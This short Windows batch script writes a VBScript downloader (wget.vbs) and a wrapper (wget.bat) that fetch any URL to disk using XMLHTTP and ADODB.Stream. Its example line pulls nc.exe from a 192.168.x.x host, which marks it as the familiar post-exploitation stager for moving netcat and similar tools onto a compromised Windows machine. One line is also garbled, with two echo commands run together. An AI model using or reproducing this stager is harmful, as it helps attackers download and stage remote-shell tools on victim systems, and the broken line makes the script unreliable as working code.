@echo off
echo cscript wget.vbs %%1 %%2 >wget.bat
echo Preparing wget.vbs
echo strUrl = WScript.Arguments.Item(0) >wget.vbs
echo strFile = WScript.Arguments.Item(1) >>wget.vbs
echo Dim DataBin >>wget.vbs
echo Dim HTTPGET >>wget.vbs
echo Set HTTPGET = CreateObject("Microsoft.XMLHTTP") >>wget.vbs
echo HTTPGET.Open "GET", strURL, False >>wget.vbs
echo HTTPGET.Send >>wget.vbsecho DataBin = HTTPGET.ResponseBody >>wget.vbs
echo Const adTypeBinary=1 >>wget.vbs
echo Const adSaveCreateOverWrite=2 >>wget.vbs
echo Dim wget1 >>wget.vbs
echo Set wget1 = CreateObject("ADODB.Stream") >>wget.vbs
echo wget1.Type = adTypeBinary >>wget.vbs
echo wget1.Open >>wget.vbs
echo wget1.Write DataBin >>wget.vbs
echo wget1.SaveToFile strFile, adSaveCreateOverWrite >>wget.vbs
echo.
echo eg: wget http://192.168.14.145/nc.exe nc.exe